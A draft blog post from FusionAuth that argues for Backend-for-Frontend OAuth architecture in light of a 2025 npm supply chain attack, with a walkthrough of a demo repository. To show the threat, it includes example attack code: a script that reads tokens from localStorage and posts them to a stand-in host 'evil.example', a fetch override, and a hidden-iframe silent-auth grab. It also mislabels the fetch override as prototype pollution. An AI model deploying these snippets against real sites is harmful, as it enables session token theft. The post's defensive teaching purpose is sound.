@@ -1,0 +1,511 @@
+---
+publish_date: 2025-10-07
+title: "Backend-for-Frontend: The Most Secure Architecture for Browser-Based Apps"
+htmlTitle: "BFF Security Architecture: Surviving Supply Chain Attacks | FusionAuth"
+description: "Learn why Backend-for-Frontend (BFF) is the only Auth Architecture that survives npm supply chain attacks. Part 1 of 3 in our architecture-driven auth series."
+image: /img/blogs/bff/bff-header.png # TODO: replace image
+authors: Kim Maida
+categories: Education, Security
+tags: oauth, security, BFF, supply chain, npm, React, tokens, architecture, Auth0, Okta, Clerk, migration
+excerpt_separator: "{/* more */}"
+---
+
+import Aside from 'src/components/Aside.astro';
+
+On September 8, 2025, developer Josh Junon received what looked like a legitimate npm 2FA reset email. Within hours, malicious code had been injected into 18 of the most popular npm packages, exposing any application that updated dependencies that day to cryptocurrency theft. The compromised packages - including `debug` and `chalk` - receive over 2 billion downloads per week.
+
+Supply chain attacks like this are a wake-up call for anyone shipping JavaScript code to production, especially when it comes to authentication and token storage.
+
+{/* more */}
+
+The September 2025 attacks targeted cryptocurrency wallets and CI/CD secrets, but they proved that malicious code in npm packages can steal ANYTHING accessible to JavaScript. If these attackers had targeted OAuth tokens in localStorage instead of crypto wallets, millions of user sessions would have been compromised. The attack vector is identical - only the target differs. If your app stores tokens in `localStorage`, `sessionStorage`, or even in-memory variables, you are vulnerable.
+
+## An Emerging Standard: OAuth 2.0 for Browser-Based Applications
+
+OAuth 2.0 was published in October 2012, when single-page applications were just emerging and React didn't exist yet. Today's browser applications are complex distributed systems with thousands of dependencies. The [OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps) draft describes three architecture patterns for handling auth in modern browser apps, each with different security trade-offs:
+
+1. **Backend-for-Frontend (BFF)** - Most secure, tokens never touch the browser.
+2. **Token-Mediating Backend (TMB)** - Moderate security, refresh tokens protected. 
+3. **Browser-Based OAuth Client (BBOC)** - Least secure, all tokens in browser.
+
+This article, the first in a three-part series, BFF, the architecture that survives compromised JavaScript single page applications unscathed. We'll explore why it's an essential standard for modern applications handling sensitive data.
+
+<Aside type="note">
+For a conceptual introduction to BFF patterns, see Dan Moore's excellent [overview of BFF](/blog/backend-for-frontend). This article focuses on the security implications revealed by recent supply chain attacks and provides a migration path from less secure architectures.
+</Aside>
+
+## Friends Don't Let Friends Store Tokens in the Browser
+
+Anything JavaScript can read, an attacker can read.
+
+![A two-panel meme using the Flex Seal format. Top panel shows Phil Swift sticking Flex Seal on a water tank labeled 'User data', with text describing extensive OAuth security implementations including SOC2 compliance, token rotation, DPoP, and 15-minute token lifetimes. Bottom panel shows a hand easily blocking water flow, labeled with 'localStorage.setItem('access_token', token)', illustrating how storing tokens in localStorage undermines all security efforts](/img/blogs/backend-for-frontend/browser-oauth-localstorage.png)
+
+Let's take a look at how we got here, and how most developers are storing tokens today.
+
+### Where Developers Store Tokens Today
+
+Even though we've come a long way since Cross-Origin Resource Sharing (CORS) saved us from the security nightmare of OAuth [implicit grant](https://fusionauth.io/docs/lifecycle/authenticate-users/oauth/#example-implicit-grant) (`response_type=token`), it opened the door to browser apps storing tokens directly in the browser. Not just access tokens, but refresh tokens too. The most common storage options are:
+
+```javascript
+// What most developers do today
+localStorage.setItem('access_token', token);     // Survives refresh, XSS vulnerable
+sessionStorage.setItem('access_token', token);   // Tab-specific, XSS vulnerable  
+this.token = token;                              // Lost on refresh, poor UX, still XSS vulnerable
+document.cookie = `token=${token}`;              // This creates a JS-readable cookie
+```
+
+Let's compare the options:
+
+| Storage Option  | Survives Refresh | Survives New Tab | XSS Vulnerable | CSRF Vulnerable | Notes                          |
+| --------------- | ---------------- | ---------------- | -------------- | --------------- | ------------------------------ |
+| localStorage    | Yes              | Yes              | Yes            | No              | Persistent across tabs         |
+| sessionStorage  | Yes              | No               | Yes            | No              | Tab-specific                   |
+| In-Memory       | No               | No               | Yes            | No              | Lost on any navigation         |
+| Cookie          | Yes              | Yes              | Yes            | Yes             | JS-readable cookie             |
+| httpOnly Cookie | Yes              | Yes              | No             | Yes             | Server-set only, JS can't read |
+
+**Anything in JavaScript-accessible storage is XSS vulnerable.** Only httpOnly cookies (which JavaScript cannot read or set) are protected from XSS attacks. We'll get to how BFF uses httpOnly cookies in a moment.
+
+First, let's look at why XSS is such a big deal.
+
+### Why No Browser Storage Is Secure
+
+The [OAuth 2.0 for Browser-Based Applications draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#section-5.1) is crystal clear: **malicious JavaScript has the same privileges as legitimate application code**. When npm packages get compromised, your SPA becomes a vector for attack, as the attacker's code runs with full access to everything your app can access. Let's break down why each storage option fails:
+
+#### localStorage and sessionStorage
+
+```javascript
+// What 2 billion weekly downloads of compromised npm packages can do:
+const stealTokens = () => {
+  const tokens = {
+    access: localStorage.getItem('access_token'),
+    refresh: localStorage.getItem('refresh_token'),
+    idToken: localStorage.getItem('id_token')
+  };
+  
+  // Exfiltrate to attacker's server
+  fetch('https://evil.example/steal', {
+    method: 'POST',
+    body: JSON.stringify(tokens)
+  });
+};
+
+// Run immediately on load
+stealTokens();
+
+// Or run continuously
+setInterval(stealTokens, 10000); // Persistent token theft
+```
+
+This isn't theoretical. The September 2025 npm attacks included nearly identical code, just targeting different values. The draft calls this "Single-Execution Token Theft" (Section 5.1.1) when run once, or "Persistent Token Theft" (Section 5.1.2) when run repeatedly.
+
+#### In-Memory Storage
+
+Many developers think storing tokens in JavaScript variables or closures is safer:
+
+```javascript
+// "Secure" token storage in a closure
+const tokenManager = (() => {
+  let accessToken = null;
+  
+  return {
+    setToken: (token) => { accessToken = token; },
+    getToken: () => accessToken
+  };
+})();
+
+// Reality: Attackers can still steal it
+const originalFetch = window.fetch;
+window.fetch = async (...args) => {
+  // Intercept all API calls and steal tokens
+  console.log('Intercepted!', args);
+  // Send to attacker...
+  return originalFetch(...args);
+};
+```
+
+The attacker doesn't need direct access to your closure. They can override `fetch`, `XMLHttpRequest`, or any other function your app uses. This is called prototype pollution, and it's devastatingly effective.
+
+#### Web Workers and Service Workers
+
+Some frameworks store tokens in Web Workers, thinking the isolation helps:
+
+```javascript
+// In a Web Worker
+self.addEventListener('message', (event) => {
+  if (event.data.type === 'STORE_TOKEN') {
+    self.token = event.data.token;
+  }
+});
+
+// Attacker in main thread
+worker.postMessage({ type: 'GIVE_ME_TOKEN' });
+// Or just unregister the worker and create their own
+```
+
+The draft ([Section 7.4.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#name-threat-analysis-6)) specifically addresses this: attackers can unregister your Service Worker and run their own authorization flow. Even worse, they can use the "Acquisition and Extraction of New Tokens" attack (Section 5.1.3) to get fresh tokens without touching your storage at all:
+
+```javascript
+// Attacker creates hidden iframe for silent auth flow
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.src = '/authorize?prompt=none&response_type=code...';
+document.body.appendChild(iframe);
+
+// Extract authorization code when redirect happens
+iframe.onload = () => {
+  const code = new URL(iframe.contentWindow.location).searchParams.get('code');
+  // Exchange for tokens using attacker's backend
+};
+```
+
+#### The Browser Is the Problem
+
+Every browser storage mechanism shares the same fundamental flaw: **JavaScript can access it**. Whether it's `localStorage`, memory, cookies (non-httpOnly), or Web Workers, if your legitimate code can read tokens, so can an attacker's code. 
+
+The only solution is to never allow tokens to enter the browser context. That's where Backend-for-Frontend comes in.
+
+## Understanding Backend-for-Frontend Architecture
+
+Instead of treating the browser as a secure environment for token storage, BFF acknowledges the reality that the browser is a hostile environment that tokens should never be exposed to.
+
+In a BFF architecture, your backend becomes a secure vault that holds all OAuth tokens - access tokens, refresh tokens, and ID tokens. The browser only receives an opaque session identifier in an httpOnly cookie, which JavaScript cannot read or access. This single architectural decision defeats entire categories of attacks.
+
+The BFF has three core responsibilities:
+
+1. Acting as a confidential OAuth client - The BFF authenticates with the authorization server using a client secret, something a browser can never securely do.
+2. Managing OAuth tokens in server-side sessions - All tokens stay on your backend, never exposed to potentially compromised JavaScript.
+3. Proxying API requests - The browser makes requests to your BFF, which adds the appropriate access token before forwarding to resource servers.
+
+### Architecture Comparison
+
+Let's visualize the difference between traditional SPA authentication and BFF:
+
+{/* TODO: Image comparing traditional SPA authentication and BFF architecture */}
+
+In BFF, there are simply no tokens for malicious code to steal.
+
+### How BFF Prevents Attacks
+
+| Attack Type                  | Traditional SPA (Tokens in Browser)      | BFF (Tokens on Backend)              |
+| ---------------------------- | ---------------------------------------- | ------------------------------------ |
+| Single Execution Token Theft | ✅ Steals tokens from localStorage       | ❌ No tokens in browser to steal     |
+| Persistent Token Theft       | ✅ Repeatedly steals tokens              | ❌ No tokens in browser to steal     |
+| Acquisition of New Tokens    | ✅ Uses hidden iframes to get new tokens | ❌ No browser tokens, no silent auth |
+
+The only remaining attack vector is request proxying (5.1.4) - the attacker can make requests to your BFF while the user's browser is open. But they can't exfiltrate tokens for offline use, can't persist access beyond the session, and can't escalate privileges.
+
+### Security Wins
+
+Here are the concrete security benefits of BFF:
+
+#### 1. Confidential Client Authentication
+
+```javascript
+// Backend can securely use client credentials
+const tokenResponse = await fetch(tokenEndpoint, {
+  method: 'POST',
+  body: new URLSearchParams({
+    grant_type: 'authorization_code',
+    code: authCode,
+    client_id: process.env.CLIENT_ID,
+    client_secret: process.env.CLIENT_SECRET, // ← Browser can't do this
+    code_verifier: pkceVerifier
+  })
+});
+```
+
+The client secret never leaves your backend. Even if attackers compromise your frontend entirely, they cannot impersonate your application to the authorization server.
+
+#### 2. Secure Token Storage
+
+```javascript
+// Backend session storage (Redis example)
+async function storeTokens(sessionId, tokens) {
+  await redis.hset(`session:${sessionId}`, {
+    access_token: tokens.access_token,
+    refresh_token: tokens.refresh_token,
+    id_token: tokens.id_token,
+    expires_at: tokens.expires_in + Date.now()
+  });
+  await redis.expire(`session:${sessionId}`, 86400); // 24-hour TTL
+}
+```
+
+Tokens live in your backend's session store - Redis, PostgreSQL, or even encrypted memory. The browser only gets an opaque session ID in an httpOnly, Secure, SameSite cookie.
+
+#### 3. Automatic Token Refresh
+
+```javascript
+// Backend handles refresh transparently
+async function proxyApiRequest(req, res) {
+  const session = await getSession(req.cookies.sessionId);
+  
+  // Check token expiration
+  if (Date.now() > session.expires_at - 60000) { // 1 minute buffer
+    session = await refreshTokens(session.refresh_token);
+  }
+  
+  // Proxy request with valid token
+  const apiResponse = await fetch(apiEndpoint, {
+    headers: {
+      'Authorization': `Bearer ${session.access_token}`
+    }
+  });
+  
+  res.json(await apiResponse.json());
+}
+```
+
+Users never experience token expiration. The backend silently refreshes tokens before they expire, maintaining seamless user experience without security compromises.
+
+#### 4. Cross-Site Request Forgery (CSRF) Protection
+
+The httpOnly session cookie uses `SameSite=Strict`, preventing CSRF attacks. Combined with the backend's ability to validate origins and referrers, BFF provides defense-in-depth:
+
+```javascript
+// Set secure cookie options
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,    // JavaScript can't read
+  secure: true,      // HTTPS only
+  sameSite: 'strict', // CSRF protection
+  path: '/',
+  maxAge: 86400000   // Match refresh token lifetime
+});
+```
+
+### Trade-offs and Considerations
+
+The cost of BFF comes in three main forms:
+
+1. Implementation Complexity - BFF requires building and maintaining a backend service, which adds development overhead.
+2. Latency - Every API call goes through your backend, adding network hops and potential bottlenecks.
+3. Single Point of Failure - Your backend must be highly available, as it becomes critical infrastructure and a potential bottleneck for your application.
+
+BFF trades convenience for security. But given the reality of modern JavaScript supply chains, where a single compromised dependency can affect millions of applications, this tradeoff is no longer optional for applications handling sensitive data.
+
+### Benefits Beyond Security
+
+As discussed by Dan in his [BFF overview](/blog/backend-for-frontend), since the draft specifically states that each backend must be dedicated to a single frontend, BFF enables:
+
+- Resource server updates without redeploying the frontend.
+- Centralized logging and monitoring of API usage.
+- Easier integration with legacy systems.
+
+These benefits make BFF a compelling choice even beyond its security advantages.
+
+Hopefully the security case is clear enough. Next, let's look at a real-world implementation.
+
+## See BFF in Action: A Complete Demo
+
+To help you get started, We've created a [complete BFF demo repository](https://github.com/kmaida/auth-architecture). The repo includes a React frontend and a Node.js/Express backend, demonstrating the full BFF pattern with FusionAuth as the authorization server. Of course, you can adapt the backend to any language or framework.
+
+### Set Up the Architecture
+
+To follow along, you'll need Node.js, npm, and Docker installed.
+
+Start by cloning the repo and following the README instructions to set up FusionAuth, the backend, and the frontend.
+
+```bash
+git clone git@github.com:kmaida/auth-architecture.git
+cd auth-architecture
+```
+
+Next, we'll start the FusionAuth server using Docker:
+
+```bash
+docker-compose up -d
+```
+
+This should download docker images and start FusionAuth on `http://localhost:9011`. You can log in with the default admin credentials provided in the README: `admin@example.com` and `password`.
+
+Next up, we'll start the resource server - a simple API that requires authentication and returns recipes at the endpoint `/api/recipe`.
+
+To properly test cross-origin requests, we'll use a custom domain for the resource server. Add the following line to your `/etc/hosts` file:
+
+```text
+127.0.0.1 resource-api.local
+```
+
+Now, in a new terminal window, navigate to the resource server directory and install dependencies:
+
+```bash
+cd resource-server
+cp .env.sample .env
+npm install
+```
+
+Update the `.env` file to set the `CLIENT_ID_BFF_TMB` to the client ID in the `.env` comments. You can also find this in the FusionAuth admin UI under Applications > Your App > Action > View.
+
+Now start the resource server:
+
+```
+npm run dev
+```
+
+The resource server should now be running at `http://resource-api.local:5001` (that URL will return a JSON response with "not found", but that's expected).
+
+Now we'll start the backend server. In a new terminal window, navigate to the backend directory and install dependencies:
+
+```bash
+cd bff/backend
+npm install
+cp .env.sample .env
+```
+
+Edit the `.env` file to set your `CLIENT_ID`, `CLIENT_SECRET` - you can find these in the FusionAuth admin UI under Applications > Your App > Action > View.
+
+Now start the backend server:
+
+```bash
+npm run dev
+```
+
+Finally, we'll start the React frontend. In a new terminal window, navigate to the frontend directory and install dependencies:
+
+```bash
+cd bff/frontend
+npm install
+cp .env.sample .env
+npm run dev
+```
+
+This should start the React app at `http://localhost:5173/`.
+
+### Architecture Overview
+
+You should now have four services running:
+
+1. FusionAuth (Authorization Server) running as a Docker container at `http://localhost:9011`
+2. Resource Server (API) running at `http://resource-api.local:5001`
+3. Backend Server (BFF) running at `http://localhost:4001`
+4. Frontend (React) running at `http://localhost:5173`
+
+The architecture looks like this:
+
+{/* TODO: Add architecture diagram */}
+
+### The Authentication Flow
+
+Navigate to the frontend at `http://localhost:5173/` in your browser. You should see a simple React app with a "Login" button.
+
+#### 1. Session Check on Page Load
+
+When the app loads, the frontend checks for an existing session by calling the backend. Heres the simplified code from the React app (without error handling and surrounding code):
+
+```javascript
+// Frontend: /bff/frontend/src/services/authService.js
+async checkSession() {
+  const response = await fetch(`${apiUrl}/auth/checksession`, {
+    credentials: 'include'  // Sends httpOnly cookie
+  });
+  const data = await response.json();
+
+  if (data.loggedIn) {
+    setUserInfo(data.user);
+  } else {
+    setUserInfo(null);
+  }
+}
+```
+
+Since there is no user session, the backend responds with `loggedIn: false`, and the app shows the "Login" button.
+
+The backend's response includes an httpOnly cookie `p` with a state value, PKCE code verifier, and challenge. This is stored securely in the browser and sent with every request to the backend while the user doesn't have a session yet.
+
+Click the "Login" button to start the OAuth authorization code flow.
+
+#### 2. Secure Login with PKCE
+
+When you click "Login", the frontend redirects you to the backend's `http://localhost:4001/auth/login` endpoint, which then redirects to FusionAuth's authorization endpoint with the appropriate parameters, including PKCE challenge.
+
+If you aren't logged into FusionAuth yet, you'll see the login screen. Register a new user.
+
+FusionAuth will redirect back to the backend with an authorization code. The backend exchanges the code for tokens using the client secret, which is never exposed to the browser.
+
+Then the backend creates a session, storing the tokens in memory (for demo purposes - use Redis or a database in production), and sets an httpOnly cookie with the session identifier.
+
+Finally, the backend redirects us back to the frontend.
+
+The frontend calls `checkSession` again, and this time the backend responds with `loggedIn: true` and user info. The app now shows the user's name and new navigation options: "Protected", "Profile", "Call API", and "Logout".
+
+Visiting these pages demonstrates the core BFF functionality:
+
+#### 3. Proxying API Requests
+
+Each of the "Protected", "Profile", and "Call API" pages makes requests to the backend, which adds the access token from the session before forwarding to the resource server.
+
+The browser never sees any access tokens, nor does it interact directly with the resource server.
+
+If everything worked, you should see a random recipie on the "Call API" page, fetched securely through the BFF.
+
+#### 4. Automatic Token Refresh
+
+The backend automatically refreshes tokens when they are close to expiring. You can test this by reducing the access token lifetime in FusionAuth to 1 minute, then waiting a few minutes and clicking "Call API" again. The backend will use the refresh token to get a new access token before making the API call.
+
+## FusionAuth's Hosted Backend: BFF Made Simple
+
+FusionAuth's hosted backend takes care of all the complexities of implementing a secure BFF architecture. With built-in support for OAuth 2.0, PKCE, and secure cookie handling, you can focus on building your application without worrying about the underlying security infrastructure.
+
+### Getting Started
+
+We've included a Hosted Backend demo in the same [auth-architecture repository](https://github.com/kmaida/auth-architecture). The setup is similar to the self-hosted BFF demo, but instead of running your own backend server, you'll configure the frontend to use FusionAuth's hosted backend.
+
+You'll find the demo in the `bff-hb` directory. Follow the README instructions to set up FusionAuth and the React frontend.
+
+```bash
+cd bff-hb/frontend
+npm install
+cp .env.sample .env
+```
+
+Update the `.env` file to set your `VITE_CLIENT_ID` to the client ID of your application in FusionAuth.
+
+<Aside type="note">
+If you've been following along with the self-hosted BFF demo, you can skip setting up the resource server and FusionAuth again. Just make sure to end the Backend and Frontend servers from the previous demo before starting this one.
+</Aside>
+
+Then start the frontend:
+
+```bash
+npm run dev
+```
+
+### Architecture Overview
+
+The architecture looks like this:
+
+{/* TODO: Hosted backend diagram */}
+
+Instead of your own backend server, the React app communicates directly with FusionAuth's hosted backend. FusionAuth manages the OAuth flow, token storage, and session management for you, while securely proxying API requests to your resource server. Each request from the frontend includes an httpOnly cookie with the session identifier, ensuring that tokens are never exposed to JavaScript.
+
+## The Decision Framework: When BFF Is Essential
+
+If you're still storing tokens where JavaScript can access them, consider migrating to a BFF architecture as soon as possible. The security benefits are too significant to ignore, especially in light of recent supply chain attacks.
+
+That said, BFF isn't necessary for every application. Here are some guidelines to help you decide.
+
+If your application meets any of the following criteria, BFF is strongly recommended:
+
+✅ Handling sensitive data (PII, financial, healthcare).
+✅ Building business-critical applications.
+✅ Subject to compliance requirements.
+✅ You control the backend.
+✅ Security is more important than convenience.
+
+## Next Steps
+
+1. Audit your current token storage (open DevTools, check Application tab).
+2. Evaluate whether your current auth provider's default pattern is secure.
+
+## Try It Yourself
+
+- Clone and run the [BFF demo repository](https://github.com/kmaida/auth-architecture).
+- Try FusionAuth's hosted backend for instant BFF security.
+- Plan your migration from less secure patterns.
+
+## What's Next in This Series
+
+In Part 2, we'll examine Token-Mediating Backend (TMB) - the middle-ground approach that many auth providers use by default. You'll learn why it's better than storing all tokens in the browser but still falls short of BFF's security guarantees. We'll look at real implementations from Auth0, Clerk, and others, and discuss when TMB might be acceptable despite its limitations.
+
+Part 3 will cover Browser-Based OAuth Client (BBOC) architecture - the least secure pattern that the draft specifically recommends against for sensitive applications. We'll explore why some providers still default to this pattern and what you absolutely must do if you're stuck with it.
